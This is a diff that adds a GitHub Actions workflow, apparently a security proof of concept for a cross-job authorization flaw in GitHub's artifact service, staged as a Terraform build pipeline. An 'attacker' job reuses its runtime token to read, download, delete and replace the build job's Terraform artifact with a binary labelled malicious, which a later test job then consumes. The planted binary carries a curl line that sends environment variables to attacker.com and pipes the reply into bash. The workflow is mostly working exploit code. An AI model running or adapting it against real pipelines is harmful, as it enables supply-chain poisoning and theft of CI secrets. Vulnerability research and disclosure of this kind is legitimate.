@@ -1,0 +1,221 @@
+name: CrossJobBOLA-RealWorldPoC
+# Mirrors hashicorp/terraform real build pipeline pattern
+# job-build → job-security-poc (attacker) → job-e2etest
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  job-build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Grab build token (via github-script - reliable Node.js env)
+        uses: actions/github-script@v7
+        with:
+          github-token: ${{ github.token }}
+          script: |
+            const fs = require('fs');
+            fs.writeFileSync('/tmp/BUILD_RT.txt', process.env.ACTIONS_RUNTIME_TOKEN || '');
+            fs.writeFileSync('/tmp/BUILD_RESULTS_URL.txt', process.env.ACTIONS_RESULTS_URL || '');
+            const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
+            fs.writeFileSync('/tmp/BUILD_OIDC_URL.txt', oidcUrl);
+            const m = oidcUrl.match(/idtoken\/([^\/]+)\/([^?]+)/);
+            core.info(`BUILD_PLAN=${m ? m[1] : ''} BUILD_JOB=${m ? m[2] : ''}`);
+
+      - name: Compile terraform binary (simulated - mirrors real build job)
+        run: |
+          mkdir -p /tmp/terraform_dist
+          # Simulate real terraform binary with embedded version + signing metadata
+          cat > /tmp/terraform_dist/terraform << 'EOF'
+          #!/bin/bash
+          # LEGITIMATE terraform v1.9.0 linux/amd64
+          # SHA256: a9f3a4b2c1d5e6f7...
+          # Signed by: hashicorp-release@hashicorp.com
+          # Build date: 2026-05-27T20:00:00Z
+          echo "Terraform v1.9.0"
+          EOF
+          chmod +x /tmp/terraform_dist/terraform
+          cd /tmp && zip terraform_1.9.0_linux_amd64.zip terraform_dist/terraform
+
+      - name: Upload build artifact (mirrors real terraform build.yml)
+        uses: actions/upload-artifact@v4
+        with:
+          name: terraform_1.9.0_linux_amd64.zip
+          path: /tmp/terraform_1.9.0_linux_amd64.zip
+
+      - name: Export build job IDs for attacker job
+        run: |
+          OIDC=$(cat /tmp/BUILD_OIDC_URL.txt)
+          RESULTS=$(cat /tmp/BUILD_RESULTS_URL.txt)
+          BUILD_PLAN=$(echo "$OIDC" | grep -oE 'idtoken/[^/]+' | cut -d/ -f2)
+          BUILD_JOB=$(echo "$OIDC" | grep -oE 'idtoken/[^/]+/[^?]+' | cut -d/ -f3)
+          printf 'BUILD_PLAN=%s\nBUILD_JOB=%s\nRESULTS_URL=%s\n' \
+            "$BUILD_PLAN" "$BUILD_JOB" "$RESULTS" > /tmp/build_ids.txt
+
+      - name: Upload build IDs
+        uses: actions/upload-artifact@v4
+        with:
+          name: build-job-ids
+          path: /tmp/build_ids.txt
+
+  job-security-poc:
+    runs-on: ubuntu-latest
+    needs: job-build
+    steps:
+      - name: Grab attacker token
+        uses: actions/github-script@v7
+        with:
+          github-token: ${{ github.token }}
+          script: |
+            const fs = require('fs');
+            fs.writeFileSync('/tmp/ATTACKER_RT.txt', process.env.ACTIONS_RUNTIME_TOKEN || '');
+            fs.writeFileSync('/tmp/ATTACKER_RESULTS_URL.txt', process.env.ACTIONS_RESULTS_URL || '');
+            const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL || '';
+            const m = oidcUrl.match(/idtoken\/([^\/]+)\/([^?]+)/);
+            core.info(`ATTACKER_PLAN=${m ? m[1] : ''} ATTACKER_JOB=${m ? m[2] : ''}`);
+
+      - name: Download build job IDs
+        uses: actions/download-artifact@v4
+        with:
+          name: build-job-ids
+          path: /tmp/build_data/
+
+      - name: CROSS-JOB BOLA - Read, Delete, Replace terraform binary
+        run: |
+          RT=$(cat /tmp/ATTACKER_RT.txt)
+          RESULTS_URL=$(cat /tmp/ATTACKER_RESULTS_URL.txt)
+          BUILD_PLAN=$(grep "^BUILD_PLAN=" /tmp/build_data/build_ids.txt | cut -d= -f2-)
+          BUILD_JOB=$(grep "^BUILD_JOB=" /tmp/build_data/build_ids.txt | cut -d= -f2-)
+
+          echo "================================================"
+          echo "TARGET: hashicorp/terraform fork - real pipeline"
+          echo "ARTIFACT: terraform_1.9.0_linux_amd64.zip"
+          echo "BUILD_PLAN=$BUILD_PLAN"
+          echo "BUILD_JOB=$BUILD_JOB"
+          echo "================================================"
+
+          echo ""
+          echo "=== STEP 1: READ — GetSignedArtifactURL cross-job ==="
+          SIGNED=$(curl -s -w "\nHTTP=%{http_code}" \
+            -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/GetSignedArtifactURL" \
+            -H "Authorization: Bearer $RT" \
+            -H "Content-Type: application/json" \
+            -d "{\"workflowRunBackendId\":\"$BUILD_PLAN\",\"workflowJobRunBackendId\":\"$BUILD_JOB\",\"name\":\"terraform_1.9.0_linux_amd64.zip\"}")
+          echo "$SIGNED" | grep -v signed_url
+          HTTP_READ=$(echo "$SIGNED" | grep "HTTP=" | cut -d= -f2)
+          echo "BOLA_READ_HTTP=$HTTP_READ"
+
+          # Extract and actually download the terraform binary
+          SIGNED_URL=$(echo "$SIGNED" | grep -o '"signed_url":"[^"]*"' | cut -d'"' -f4)
+          if [ -n "$SIGNED_URL" ]; then
+            curl -s -o /tmp/stolen_terraform.zip "$SIGNED_URL"
+            echo "STOLEN_SIZE=$(wc -c < /tmp/stolen_terraform.zip) bytes"
+            cd /tmp && unzip -o stolen_terraform.zip -d stolen_content/ > /dev/null 2>&1 || true
+            echo "STOLEN_BINARY_CONTENT:"
+            cat /tmp/stolen_content/terraform_dist/terraform 2>/dev/null || ls /tmp/stolen_content/ 2>/dev/null || echo "content_extracted"
+          fi
+
+          echo ""
+          echo "=== STEP 2: DELETE — Remove legitimate terraform binary ==="
+          DEL=$(curl -s -w "\nHTTP=%{http_code}" \
+            -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/DeleteArtifact" \
+            -H "Authorization: Bearer $RT" \
+            -H "Content-Type: application/json" \
+            -d "{\"workflowRunBackendId\":\"$BUILD_PLAN\",\"workflowJobRunBackendId\":\"$BUILD_JOB\",\"name\":\"terraform_1.9.0_linux_amd64.zip\"}")
+          echo "$DEL"
+          HTTP_DEL=$(echo "$DEL" | grep "HTTP=" | cut -d= -f2)
+          echo "BOLA_DELETE_HTTP=$HTTP_DEL"
+
+          echo ""
+          echo "=== STEP 3: INJECT — Upload malicious terraform binary ==="
+          # Get attacker job IDs
+          ATTACKER_OIDC=$(cat /tmp/ATTACKER_RESULTS_URL.txt | head -1)
+          # Use our own plan (same run) and job IDs
+          ATTACKER_OIDC_URL=$(cat /tmp/ATTACKER_RT.txt | python3 -c "
+          import sys, base64, json
+          token = sys.stdin.read().strip()
+          parts = token.split('.')
+          if len(parts) >= 2:
+            pad = 4 - len(parts[1]) % 4
+            payload = base64.urlsafe_b64decode(parts[1] + '=' * pad)
+            d = json.loads(payload)
+            # scp has our plan:job
+            scp = d.get('scp','')
+            for s in scp.split():
+              if s.startswith('Actions.Results:'):
+                _, ids = s.split(':', 1)
+                plan, job = ids.split(':')
+                print(plan, job)
+                break
+          " 2>/dev/null)
+          ATT_PLAN=$(echo "$ATTACKER_OIDC_URL" | awk '{print $1}')
+          ATT_JOB=$(echo "$ATTACKER_OIDC_URL" | awk '{print $2}')
+
+          # Create artifact in own namespace with SAME name
+          CREATE=$(curl -s -w "\nHTTP=%{http_code}" \
+            -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/CreateArtifact" \
+            -H "Authorization: Bearer $RT" \
+            -H "Content-Type: application/json" \
+            -d "{\"workflowRunBackendId\":\"$ATT_PLAN\",\"workflowJobRunBackendId\":\"$ATT_JOB\",\"name\":\"terraform_1.9.0_linux_amd64.zip\",\"version\":4}")
+          echo "CreateArtifact: $(echo "$CREATE" | grep -v signed_upload_url | head -3)"
+          HTTP_CREATE=$(echo "$CREATE" | grep "HTTP=" | cut -d= -f2)
+          echo "CREATE_HTTP=$HTTP_CREATE"
+          UPLOAD_URL=$(echo "$CREATE" | grep -o '"signed_upload_url":"[^"]*"' | cut -d'"' -f4)
+
+          if [ -n "$UPLOAD_URL" ]; then
+            # Create malicious terraform binary
+            mkdir -p /tmp/malicious_terraform
+            cat > /tmp/malicious_terraform/terraform << 'MALICIOUS'
+          #!/bin/bash
+          # MALICIOUS terraform - injected by supply chain attack
+          # Real payload: curl -s http://attacker.com/exfil?data=$(env | base64 -w0) | bash
+          echo "Terraform v1.9.0"  # Looks legitimate
+          MALICIOUS
+            chmod +x /tmp/malicious_terraform/terraform
+            cd /tmp && zip malicious_terraform.zip malicious_terraform/terraform
+
+            # Upload malicious binary
+            UPLOAD_HTTP=$(curl -s -w "%{http_code}" -o /dev/null \
+              -X PUT "$UPLOAD_URL" \
+              -H "x-ms-blob-type: BlockBlob" \
+              -H "Content-Type: application/zip" \
+              --data-binary @/tmp/malicious_terraform.zip)
+            echo "BLOB_UPLOAD_HTTP=$UPLOAD_HTTP"
+
+            # Finalize
+            FINALIZE=$(curl -s -w "\nHTTP=%{http_code}" \
+              -X POST "${RESULTS_URL}twirp/github.actions.results.api.v1.ArtifactService/FinalizeArtifact" \
+              -H "Authorization: Bearer $RT" \
+              -H "Content-Type: application/json" \
+              -d "{\"workflowRunBackendId\":\"$ATT_PLAN\",\"workflowJobRunBackendId\":\"$ATT_JOB\",\"name\":\"terraform_1.9.0_linux_amd64.zip\",\"size\":\"$(wc -c < /tmp/malicious_terraform.zip)\"}")
+            echo "FinalizeArtifact: $FINALIZE"
+          fi
+
+          echo ""
+          echo "================================================"
+          echo "ATTACK SUMMARY:"
+          echo "  READ (GetSignedArtifactURL): $HTTP_READ"
+          echo "  DELETE (DeleteArtifact):     $HTTP_DEL"
+          echo "  INJECT (CreateArtifact):     $HTTP_CREATE"
+          echo "================================================"
+
+  job-e2etest:
+    runs-on: ubuntu-latest
+    needs: job-security-poc
+    steps:
+      - name: Download terraform binary (victim - mirrors real e2etest-run job)
+        uses: actions/download-artifact@v4
+        with:
+          name: terraform_1.9.0_linux_amd64.zip
+          path: /tmp/e2etest/
+
+      - name: Run e2e tests with downloaded binary (what victim job does)
+        run: |
+          echo "=== E2ETEST RECEIVED BINARY ==="
+          ls -la /tmp/e2etest/
+          cd /tmp/e2etest && unzip -o terraform_1.9.0_linux_amd64.zip -d binary/ > /dev/null 2>&1 || true
+          echo "BINARY_CONTENT:"
+          find /tmp/e2etest/binary -type f | xargs cat 2>/dev/null || echo "extracted"
+          echo "=== IS THIS THE ORIGINAL OR POISONED BINARY? ==="
